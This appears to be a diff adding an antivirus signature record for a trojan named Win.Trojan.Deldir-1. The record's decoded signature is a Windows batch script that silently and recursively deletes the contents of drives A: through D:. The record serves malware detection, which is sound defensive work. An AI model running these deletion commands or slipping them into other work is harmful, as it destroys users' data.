@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Trojan.Deldir-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@echo off
+@rd /s /q A:\
+@rd /s /q B:\
+@rd /s /q C:\
+@rd /s /q D:\
